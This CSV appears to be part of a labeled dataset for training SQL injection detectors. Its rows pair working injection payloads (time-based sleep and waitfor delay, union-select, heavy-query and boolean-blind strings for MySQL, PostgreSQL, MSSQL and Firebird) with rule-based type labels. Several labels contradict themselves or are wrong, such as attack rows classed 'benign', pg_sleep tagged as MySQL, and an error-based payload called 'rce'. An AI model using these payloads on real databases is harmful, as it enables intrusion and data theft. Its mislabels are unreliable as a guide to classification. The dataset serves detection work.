row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
10200,"1"" rlike sleep ( 5 ) and ""rylv"" like ""rylv",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10201,"1' ) as elnu where 5719 = 5719 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
10202,"1"" ) where 8702 = 8702 union all select null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10203,-8515' or 1329 = 9536,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10204,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10205,"1'+ ( select thmg where 2546 = 2546 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
10206,"1%"" ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""%"" = """,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
10207,"1 ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 2952 = 2952",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
10208,1 ) where 9446 = 9446 union all select null#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10209,1 ) as bozx where 2160 = 2160 and sleep ( 5 ) #,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10210,1%' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( '%' = ',1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10211,"1 ) ) ) union all select null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10212,"1 ) where 7775 = 7775 union all select null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10213,1' ) ) rlike sleep ( 5 ) and ( ( 'tufg' = 'tufg,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10214,"1"" ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( ""epwi"" like ""epwi",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
10215,"1"" ) ) and 6486 = 3843 and ( ( ""fbka"" like ""fbka",1,,boolean_blind,generic,0.95,"6486 = 3843 and, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
10216,1'+ ( select 'gprq' where 8928 = 8928,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10217,1' ) ) as azsd where 3870 = 3870 waitfor delay '0:0:5'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10218,"1%"" ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( ""%"" = """,1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
10219,"1"""" ( .'. ( , ( .",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
10220,"1"" ) ) as wssb where 5772 = 5772",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10221,"select pg_sleep ( 5 ) and ( ""tpry"" = ""tpry",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10222,"1"" ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ""cbck"" like ""cbck",1,,boolean_blind,mysql,0.95,"like "" detected — boolean_blind injection (priority 8) on mysql",rule-based
10223,"1%"" ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ""%"" = """,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10224,"1' ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'gyre' = 'gyre",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
10225,"1'|| ( select 'fqoz' where 9794 = 9794 union all select null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10226,"1"" ) ) or sleep ( 5 ) and ( ( ""mtmb"" like ""mtmb",1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10227,1 where 7890 = 7890 or sleep ( 5 ) --,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10228,1 ) and sleep ( 5 ),1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10229,1 ) where 1013 = 1013 and 5573 = 9445#,1,,boolean_blind,generic,0.95,1013 = 1013 and detected — boolean_blind injection (priority 8) on generic,rule-based
